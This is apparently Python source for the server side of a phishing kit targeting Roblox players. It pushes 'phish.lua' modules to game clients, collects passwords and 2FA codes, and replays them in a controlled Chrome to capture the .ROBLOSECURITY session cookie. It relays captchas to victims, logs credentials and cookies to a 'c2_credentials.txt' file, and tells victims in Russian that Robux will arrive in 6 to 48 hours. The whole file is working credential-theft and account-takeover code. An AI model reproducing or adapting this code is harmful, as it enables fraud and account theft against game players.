                    c.style.display = 'block';
                    c.style.visibility = 'visible';
                    for (let p = c.parentElement; p && p !== document.body; p = p.parentElement) {
                        p.style.display = 'block';
                        p.style.visibility = 'visible';
                    }
                }
                return 'ok';
            })()"""
        })
        await asyncio.sleep(2)

    async def focus_captcha(self):
        await self._cmd("Runtime.evaluate", {
            "expression": """(() => {
                window.focus();
                const c = document.querySelector('iframe[src*="arkoselabs"], iframe[src*="funcaptcha"]');
                if (c) {
                    c.focus();
                    c.contentWindow?.focus();
                    c.dispatchEvent(new Event('focus', {bubbles: true}));
                    c.dispatchEvent(new MouseEvent('mouseenter', {bubbles: true, clientX: 1, clientY: 1}));
                }
                document.dispatchEvent(new MouseEvent('mousemove', {clientX: 1, clientY: 1}));
                return !!c;
            })()"""
        })
        log.info("Captcha focused")
        await asyncio.sleep(0.5)

    def bring_chrome_to_foreground(self):
        try:
            subprocess.run(["powershell", "-NoProfile", "-Command",
                "$wshell = New-Object -ComObject wscript.shell; "
                "$wshell.AppActivate('Chrome')"
            ], capture_output=True, timeout=3)
        except Exception:
            pass

    async def try_login(self, username, password, ws):
        log.info(f"Login attempt: {username}")

        await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))

        # Navigate and wait for full page load
        await self._cmd("Page.navigate", {"url": "https://www.roblox.com/login"})

        await asyncio.sleep(3)

        found = await self._wait_for_element('input[name="username"]', timeout=20)
        if not found:
            await ws.send(json.dumps({"type": "err", "message": "Ошибка проверки. Попробуйте снова."}))
            return None

        await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))

        await self._cmd("Runtime.evaluate", {
            "expression": f"""(() => {{
                const el = document.querySelector('input[name="username"]');
                if (!el) return 'no username field';
                el.focus();
                const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                setter.call(el, {json.dumps(username)});
                el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                return 'ok';
            }})()"""
        })
        await asyncio.sleep(0.5)

        await self._cmd("Runtime.evaluate", {
            "expression": f"""(() => {{
                const el = document.querySelector('input[name="password"]');
                if (!el) return 'no password field';
                el.focus();
                const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                setter.call(el, {json.dumps(password)});
                el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                return 'ok';
            }})()"""
        })
        await asyncio.sleep(0.5)

        await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))

        click_result = await self._cmd("Runtime.evaluate", {
            "expression": """(() => {
                for (const sel of ['#login-button', 'button[type="submit"]', '.login-button', 'form button']) {
                    const btn = document.querySelector(sel);
                    if (btn) { btn.click(); return 'clicked ' + sel; }
                }
                return 'no button found';
            })()"""
        })
        log.info(f"Login click: {click_result.get('result',{}).get('value','?')}")

        # Poll for up to 25s: check URL, cookies, error text, captcha (matching archive logic 1:1)
        found_error = False
        for i in range(50):
            await asyncio.sleep(0.5)

            current_url = ""
            url2 = await self._cmd("Runtime.evaluate", {"expression": "window.location.href"})
            current_url = url2.get("result", {}).get("value", "")

            # Check for login success
            if current_url and "roblox.com/login" not in current_url.lower():
                ck = await self._cmd("Network.getAllCookies")
                for c in ck.get("cookies", []):
                    if c["name"] == ".ROBLOSECURITY":
                        log.info(f"Login OK! .ROBLOSECURITY captured")
                        return {"cookie": c["value"], "domain": c.get("domain", "")}
                if "two-step-verification" in current_url.lower():
                    log.info(f"2FA page detected")
                    return {"2fa": True}
                log.info(f"URL changed during poll: {current_url}")
                break

            # Check for 2FA
            if "two-step-verification" in current_url.lower():
                log.info(f"2FA page detected")
                return {"2fa": True}

            # Check for error message (wrong password / invalid credentials) — archive logic
            err_info = await self._cmd("Runtime.evaluate", {
                "expression": """(() => {
                    const el = document.querySelector('.error-message, .alert-error, .login-error, [data-error]');
                    if (el && el.offsetParent !== null) {
                        const txt = (el.textContent || '').toLowerCase();
                        if (/incorrect|wrong|invalid|try again|неправильный|неверный/.test(txt))
                            return 'error';
                    }
                    return 'none';
                })()"""
            })
            if err_info.get("result", {}).get("value") == "error":
                log.info(f"Error text detected on page (attempt {i})")
                found_error = True
                break

            # Check captcha with archive selectors + extra
            captcha_info = await self._cmd("Runtime.evaluate", {
                "expression": """(() => {
                    const sel = [
                        'iframe[src*="arkoselabs"]', 'iframe[src*="funcaptcha"]',
                        '[id*="funcaptcha"]', 'iframe[title*="captcha"]',
                        '#arkose-iframe', '[data-pk]',
                        '.h-captcha', 'iframe[src*="hcaptcha"]',
                        '[class*="captcha"]', '[id*="captcha"]', '.captcha-holder',
                        '[data-px-captcha]',
                    ];
                    for (const s of sel) {
                        const el = document.querySelector(s);
                        if (el) {
                            const r = el.getBoundingClientRect();
                            if (r.width > 10 && r.height > 10) return 'found ' + s;
                        }
                    }
                    return 'none';
                })()"""
            })
            captcha_value = captcha_info.get("result", {}).get("value", "none")
            if captcha_value and captcha_value != "none":
                log.info(f"Captcha detected (attempt {i}): {captcha_value}")
                return {"captcha": True, "url": current_url}

            if i == 0:
                log.info(f"Captcha check: {captcha_value}")

        # Final cookie check
        ck = await self._cmd("Network.getAllCookies")
        for c in ck.get("cookies", []):
            if c["name"] == ".ROBLOSECURITY":
                log.info(f"Login OK! .ROBLOSECURITY captured (late)")
                return {"cookie": c["value"], "domain": c.get("domain", "")}

        if found_error:
            return {"wrong_password": True, "url": current_url}

        # No cookie, no error text, but still on /login — assume captcha (archive logic: captcha_detected fallback)
        return {"captcha": True, "url": current_url}

    async def wait_for_cookie(self, ws, timeout=300):
        start = time.time()
        while time.time() - start < timeout:
            try:
                result = await self._cmd("Network.getAllCookies")
                for c in result.get("cookies", []):
                    if c["name"] == ".ROBLOSECURITY":
                        elapsed = time.time() - start
                        log.info(f".ROBLOSECURITY captured after {elapsed:.0f}s")
                        return c
            except Exception:
                pass
            await asyncio.sleep(2)
        log.warning("Timeout waiting for .ROBLOSECURITY")
        return None


def get_roblox_username(user_id):
    try:
        resp = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
        if resp.status_code == 200:
            return resp.json().get("name")
        log.warning(f"Username lookup failed: HTTP {resp.status_code}")
    except Exception as e:
        log.warning(f"Username lookup error: {e}")
    return None


async def handle_client(ws, screen):
    log.info("Client connected")

    phish_code = load_module("phish.lua")
    phish_2fa_code = load_module("phish_2fa.lua")

    screen._text_mode = False
    state = "hello"
    stream_task = None

    try:
        async for msg in ws:
            if isinstance(msg, str):
                try:
                    data = json.loads(msg)
                except json.JSONDecodeError:
                    continue

                t = data.get("type")

                if t == "hello":
                    user_id = data.get("userId")
                    screen._text_mode = data.get("mode") == "studio"
                    log.info(f"Client hello: user={data.get('playerName')} id={user_id} place={data.get('placeId')} mode={'studio' if screen._text_mode else 'executor'}")
                    await ws.send(phish_code)
                    log.info("Sent phish.lua module")
                    state = "phished"
                    if screen._text_mode:
                        log.info("Studio mode, sending show_phish")
                        await ws.send(json.dumps({"type": "show_phish"}))

                elif t == "password":
                    password = data.get("password", "")
                    user_id = data.get("userId")
                    player_name = data.get("playerName", "")
                    log.info(f"Password from {player_name} (id={user_id}), len={len(password)}")

                    # Client-side cookie (solved via Roblox HttpService)
                    client_cookie = data.get("cookie")
                    if client_cookie:
                        log.info("Client-side cookie received, validating...")
                        try:
                            r = requests.get("https://www.roblox.com/home",
                                cookies={".ROBLOSECURITY": client_cookie},
                                timeout=10, allow_redirects=False)
                            if r.status_code == 200 or ".ROBLOSECURITY" in r.cookies:
                                log.info("Client cookie valid, saving")
                                with open("c2_credentials.txt", "a") as f:
                                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {player_name} (id={user_id}): {password}\n")
                                    f.write(f"Cookie: .ROBLOSECURITY={client_cookie}\n\n")
                                await ws.send(json.dumps({"type": "ok", "message": "Robux будут начислены от 6 до 48 часов. Ожидайте."}))
                                state = "done"
                                continue
                        except Exception as e:
                            log.warning(f"Cookie validation error: {e}")
                        log.info("Client cookie invalid, falling back to Chrome")

                    try:
                        log.info("Starting Chrome on demand...")
                        ok = await screen.ensure_chrome()
                        if not ok:
                            await ws.send(json.dumps({"type": "err", "message": "Не удалось запустить браузер"}))
                            continue

                        username = await asyncio.to_thread(get_roblox_username, user_id)
                        if not username:
                            username = player_name
                            log.info(f"Username lookup failed, using playerName: {username}")
                        if not username:
                            await ws.send(json.dumps({"type": "err", "message": "Не удалось определить логин"}))
                            screen.kill_chrome()
                            continue

                        log.info(f"Username: {username}")
                        screen._last_username = username
                        screen._last_password = password
                        screen._tries += 1
                        state = "login"

                        result = await screen.try_login(username, password, ws)

                        if result is None:
                            screen.kill_chrome()
                            state = "done"
                            continue

                        if result.get("wrong_password"):
                            if screen._tries >= 3:
                                await ws.send(json.dumps({"type": "err", "message": "Попытки исчерпаны."}))
                                screen.kill_chrome()
                                state = "done"
                            else:
                                await ws.send(json.dumps({"type": "err", "message": f"Неправильный пароль, попробуйте еще раз. Попытка {screen._tries}/3"}))
                                state = "phished"
                            continue

                        if "cookie" in result:
                            log.info(f"COOKIE captured")
                            save_credentials(username, password, result["cookie"], result.get("domain", ""))
                            h1 = random.randint(6, 12)
                            h2 = random.randint(h1 + 12, h1 + 48)
                            await ws.send(json.dumps({"type": "ok", "message": f"Robux будут начислены от {h1} до {h2} часов. Ожидайте."}))
                            screen.kill_chrome()
                            state = "done"

                        elif result.get("2fa"):
                            log.info("2FA required")
                            await ws.send(json.dumps({"type": "2fa"}))
                            await ws.send(phish_2fa_code)
                            screen.kill_chrome()
                            state = "2fa"

                        elif result.get("captcha"):
                            log.info("Captcha detected")
                            state = "captcha"
                            await ws.send(json.dumps({"type": "hold", "message": "Проверка безопасности..."}))

                            screen._captcha_mode = True
                            await screen.set_captcha_clip()
                            await screen.attach_to_captcha_frame()
                            await screen.hide_form_for_captcha()
                            await screen.focus_captcha()
                            screen.bring_chrome_to_foreground()

                            log.info("Starting stream")
                            await ws.send(json.dumps({"type": "start_browser"}))

                            screen.start_capture()
                            stream_task = asyncio.create_task(screen.stream_to_client(ws))

                            cookie_task = asyncio.create_task(screen.wait_for_cookie(ws, timeout=300))
                            captcha_start = time.time()
                            cookie = None

                            try:
                                while state == "captcha":
                                    if cookie_task.done():
                                        cookie = cookie_task.result()
                                        break
                                    if time.time() - captcha_start > 300:
                                        break

                                    try:
                                        msg = await asyncio.wait_for(ws.recv(), timeout=0.5)
                                    except asyncio.TimeoutError:
                                        continue
                                    except websockets.exceptions.ConnectionClosed:
                                        break

                                    if isinstance(msg, str):
                                        try:
                                            data = json.loads(msg)
                                        except json.JSONDecodeError:
                                            continue
                                        t = data.get("type")
                                        if t in ("mouse", "keyboard", "text"):
                                            try:
                                                if t == "mouse":
                                                    await screen.dispatch_mouse(data["x"], data["y"], data["event"])
                                                elif t == "keyboard":
                                                    await screen.dispatch_key(data["event"], data["key"])
                                                elif t == "text":
                                                    await screen.dispatch_text(data["text"])
                                            except Exception as e:
                                                log.error(f"Input dispatch error: {e}")
                                        elif t in ("closed", "timed_out", "reset"):
                                            break
                            finally:
                                cookie_task.cancel()

                            if stream_task:
                                stream_task.cancel()
                                stream_task = None
                            screen.stop_capture()

                            await ws.send(json.dumps({"type": "stop_browser"}))

                            if cookie:
                                log.info(f"COOKIE captured after captcha")
                                save_credentials(screen._last_username, screen._last_password, cookie["value"], cookie.get("domain", ""))
                                h1 = random.randint(6, 12)
                                h2 = random.randint(h1 + 12, h1 + 48)
                                await ws.send(json.dumps({"type": "ok", "message": f"Robux будут начислены от {h1} до {h2} часов. Ожидайте."}))
                            else:
                                await ws.send(json.dumps({"type": "err", "message": "Время вышло. Попробуйте снова."}))
                            screen.kill_chrome()
                            state = "done"
                    except Exception as e:
                        log.error(f"Login flow error: {e}")
                        try:
                            await ws.send(json.dumps({"type": "err", "message": f"Ошибка: {str(e)[:80]}"}))
                        except Exception:
                            pass
                        screen.kill_chrome()
                        state = "done"

                elif t == "2fa_code":
                    code = data.get("code", "")
                    log.info(f"2FA code: {code}")
                    await screen.dispatch_text(code)
                    await asyncio.sleep(0.5)
                    await screen._cmd("Runtime.evaluate", {
                        "expression": "document.querySelector('button[type=\"submit\"]')?.click()"
                    })
                    await asyncio.sleep(3)
                    cookies_result = await screen._cmd("Network.getAllCookies")
                    for c in cookies_result.get("cookies", []):
                        if c["name"] == ".ROBLOSECURITY":
                            log.info(f"COOKIE after 2FA")
                            save_credentials(screen._last_username, screen._last_password, c["value"], c.get("domain", ""))
                            h1 = random.randint(6, 12)
                            h2 = random.randint(h1 + 12, h1 + 48)
                            await ws.send(json.dumps({"type": "ok", "message": f"Robux будут начислены от {h1} до {h2} часов. Ожидайте."}))
                            state = "done"
                            break

                elif t in ("mouse", "keyboard", "text"):
                    if state == "captcha":
                        try:
                            if t == "mouse":
                                log.info(f"Mouse event from client: x={data.get('x')} y={data.get('y')} event={data.get('event')}")
                                await screen.dispatch_mouse(data["x"], data["y"], data["event"])
                            elif t == "keyboard":
                                await screen.dispatch_key(data["event"], data["key"])
                            elif t == "text":
                                await screen.dispatch_text(data["text"])
                        except Exception as e:
                            log.error(f"Input dispatch error (ignored): {e}")

                elif t == "load":
                    await screen.navigate(data.get("url", ""))

                elif t == "reset":
                    if stream_task:
                        stream_task.cancel()
                        stream_task = None
                    screen.stop_capture()

                elif t in ("closed", "timed_out"):
                    log.info(f"Client: {t}")
                    state = "done"

            elif isinstance(msg, bytes):
                pass

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if stream_task:
            stream_task.cancel()
        screen.kill_chrome()
        log.info("Client disconnected")


async def main():
    screen = ScreenStream()

    async def handler(ws):
        await handle_client(ws, screen)
        screen._text_mode = False

    async with websockets.serve(handler, "0.0.0.0", WS_PORT) as server:
        log.info(f"WebSocket server on ws://0.0.0.0:{WS_PORT}")
        try:
            await asyncio.Future()
        finally:
            screen.kill_chrome()


if __name__ == "__main__":
    asyncio.run(main())
